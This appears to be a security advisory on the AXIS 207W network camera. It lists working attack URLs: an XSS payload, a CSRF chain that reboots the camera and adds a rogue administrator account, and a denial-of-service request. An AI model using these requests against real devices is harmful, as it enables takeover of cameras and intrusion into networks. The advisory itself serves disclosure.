In summary, the AXIS 207W is vulnerable to numerous attacks. Some of 
these are related to wireless protocol vulnerabilities, but the majority 
are exploitable via the web application interface included with the 
camera. The most significant issue is that a CSRF attack against a user 
logged in as an administrator can lead to root access of the Linux based 
operating system on the camera. As a result, the camera can be turned 
into an internal resource for any malicous hacker, through which custom 
scripts can be launched. This can include port scans, banner grabbing, 
buffer overflow exploits, application attacks, and more. Note that this 
attack vector will bypass most firewalls.

Web Application:
# Base64 'encrypted' user/pass sent as plaintext from client to user.

# Global Cross-site scripting vulnerability:
http://<IP>/incl/image_incl.shtml?camNo=</script><script>alert(String.fromCharCode(88,83,83))</script>

# Cross-site Request Forgery attack leads to root access on camera 
through which custom scripts can be executed:
1. Reboot the camera - http://1<IP>/axis-cgi/admin/restart.cgi
2. Add a new administrator - 
http://<IP>/axis-cgi/admin/pwdgrp.cgi?action=add&user=owner1&grp=axuser&sgrp=axview:axoper:axadmin&pwd=owner1&comment=WebUser&return_page=/admin/users_set.shtml%3Fpageclose%3D1
3. Root the camera/add a backdoor -

# Denial of Service attack via restricted user account:
http://<IP>/axis-cgi/buffer/command.cgi?do=start&buffername=<unique 
buffer name>

* Workaround:*
None.
